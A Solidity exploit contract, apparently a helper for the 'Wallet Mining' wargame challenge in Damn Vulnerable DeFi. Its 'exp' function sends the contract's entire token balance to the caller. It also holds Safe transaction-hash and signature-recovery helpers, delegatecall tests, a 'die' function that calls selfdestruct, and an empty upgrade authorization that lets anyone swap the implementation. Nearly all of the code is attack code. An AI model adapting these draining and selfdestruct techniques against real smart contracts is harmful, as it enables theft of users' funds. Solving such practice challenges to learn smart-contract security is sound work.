// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity >=0.7.0 <0.9.0;

import "solmate/src/tokens/ERC20.sol";
import "hardhat/console.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@gnosis.pm/safe-contracts/contracts/common/SignatureDecoder.sol";

interface IGS {
    function domainSeparator() external view returns (bytes32);
}

contract WalletMiningHelper is SignatureDecoder, UUPSUpgradeable {
    bytes32 private constant SAFE_TX_TYPEHASH =
        0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8;

    function exp(address token) public {
        ERC20 t = ERC20(token);
        console.log("address(this)", address(this));
        console.log("balanceOf(address(this))", t.balanceOf(address(this)));
        assert(t.balanceOf(address(this)) > 1000e18);
        t.transfer(tx.origin, t.balanceOf(address(this)));
    }

    function getTransactionHash(
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address refundReceiver,
        uint256 _nonce
    ) public view returns (bytes32) {
        return
            keccak256(
                encodeTransactionData(
                    to,
                    value,
                    data,
                    operation,
                    safeTxGas,
                    baseGas,
                    gasPrice,
                    gasToken,
                    refundReceiver,
                    _nonce
                )
            );
    }

    function encodeTransactionData(
        address to,
        uint256 value,
        bytes memory data,
        uint8 operation,
        uint256 safeTxGas,
        uint256 baseGas,
        uint256 gasPrice,
        address gasToken,
        address refundReceiver,
        uint256 _nonce
    ) public view returns (bytes memory) {
        bytes32 safeTxHash = keccak256(
            abi.encode(
                SAFE_TX_TYPEHASH,
                to,
                value,
                keccak256(data),
                operation,
                safeTxGas,
                baseGas,
                gasPrice,
                gasToken,
                refundReceiver,
                _nonce
            )
        );
        return
            abi.encodePacked(
                bytes1(0x19),
                bytes1(0x01),
                IGS(0x9B6fb606A9f5789444c17768c6dFCF2f83563801)
                    .domainSeparator(),
                safeTxHash
            );
    }

    function checkSignature(
        bytes32 dataHash,
        bytes memory signatures
    ) public view returns (bytes32, bytes32, uint8, bytes32, address, bool) {
        (uint8 v, bytes32 r, bytes32 s) = signatureSplit(signatures, 0);
        assert(v > 30);
        bytes32 prefiexHash = keccak256(
            abi.encodePacked("\x19Ethereum Signed Message:\n32", dataHash)
        );
        address currentOwner = ecrecover(prefiexHash, v - 4, r, s);
        return (r, s, v, prefiexHash, currentOwner, currentOwner == tx.origin);
    }

    function staticcallTest()
        public
        view
        returns (bool, bytes memory, uint256)
    {
        (bool success, bytes memory ret) = tx.origin.staticcall(
            abi.encodeWithSignature("die()")
        );
        return (success, ret, ret.length);
    }

    function delegatecallTest() public returns (bool, bytes memory, uint256) {
        (bool success, bytes memory ret) = tx.origin.delegatecall(
            abi.encodeWithSignature("die()")
        );
        if (!success) {
            revert(string(ret));
        }
        return (success, ret, ret.length);
    }

    function die() public {
        selfdestruct(payable(tx.origin));
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal virtual override {}
}
